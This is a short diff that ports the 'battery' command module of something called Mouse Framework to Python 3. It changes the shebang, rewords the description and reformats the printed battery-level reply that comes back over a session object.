@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 #            ---------------------------------------------------
 #                              Mouse Framework                                 
@@ -21,7 +21,7 @@
 class command:
     def __init__(self):
         self.name = "battery"
-        self.description = "Get battery level."
+        self.description = "Show battery level."
     
     def run(self,session,cmd_data):
-        print session.send_command(cmd_data)
+        print("Battery level: " + session.send_command(cmd_data).decode()[15:])
